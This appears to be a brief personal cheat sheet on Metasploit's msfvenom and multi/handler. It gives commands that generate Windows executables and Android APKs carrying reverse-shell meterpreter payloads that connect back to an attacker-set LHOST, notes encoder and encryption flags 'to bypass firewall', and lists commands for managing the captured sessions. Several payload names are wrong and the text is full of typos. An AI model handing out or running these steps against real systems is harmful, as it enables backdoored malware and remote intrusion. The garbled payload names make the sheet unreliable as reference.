## msfvenom

### to create payloads
```
msfvenom -l <name>
// to list payloads , exploit etc. just specif name

```

```
msfvenom -p window/meterpreter/shell LHOST=<your_ip> LPORT=<your_port> -f exe -o output.exe

// option R use for raw format payload , like it use in android payload
ex:-

msfvenom -p android/meterpreter/shell LHOST=<your_ip> LPORT=<your_port> R -o output.apk
```
> 
> `--platform` to specfy target platform
> `--encoder`
> `--encrypt` encode or encrypt to bypass firewall

## Listner shell
> listner to listen payload request shell

```
// in msfconsole
use exploit/multi/handler
// this handler run for many type of machines
set <type> <name>
ex:- set paylod window/reverse/shell
// type if like payload etc
// name of pyload or exploit etc
// set port and ip
```

> in msflisner can use many option use help

### meterpreter shell commands

* ### sessions
   `background` make a session in background
   `session` to list all active sessions
   `session -i <id_number>` to open sesssion